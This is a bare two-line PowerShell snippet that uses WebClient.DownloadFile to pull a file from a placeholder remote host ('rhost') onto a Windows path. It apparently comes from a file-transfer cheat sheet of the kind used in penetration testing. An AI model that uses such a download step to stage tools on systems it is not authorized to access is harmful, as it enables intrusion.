$Client = New-Object System.Net.WebClient
$Client.DownloadFile("http://rhost/download.php","C:\destination")

